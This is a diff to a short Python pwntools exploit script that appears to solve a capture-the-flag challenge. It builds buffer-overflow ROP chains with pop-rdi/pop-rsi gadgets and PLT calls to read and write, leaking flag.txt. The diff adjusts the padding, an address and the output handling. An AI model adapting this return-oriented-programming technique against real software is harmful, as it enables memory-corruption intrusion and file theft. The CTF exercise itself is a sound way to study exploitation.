@@ -28,7 +28,7 @@ def main():
     fd = 3
     offset = 72
 
-    payload = b'flag.txt'
+    payload  = b'flag.txt'
     payload += b'\0' * (offset - len(payload))
 
     payload += p64(pop_rdi_ret)
@@ -41,13 +41,12 @@ def main():
 
     p.sendlineafter(b'Now, tell us a wish for next year: ', payload)
 
-    payload = b'flag.txt'
-    payload += b'\0' * (offset - len(payload))
+    payload  = b'A' * offset
 
     payload += p64(pop_rdi_ret)
     payload += p64(fd)
     payload += p64(pop_rsi_ret)
-    payload += p64(addr + 20)
+    payload += p64(addr)
     payload += p64(elf.plt.read)
 
     payload += p64(pop_rdi_ret)
@@ -57,7 +56,10 @@ def main():
     payload += p64(elf.plt.write)
 
     p.sendlineafter(b'Now, tell us a wish for next year: ', payload)
-    print(p.recv())
+    p.recvline()
+    p.recvline()
+    p.recvline()
+    print(p.recvline())
     p.close()
 
 
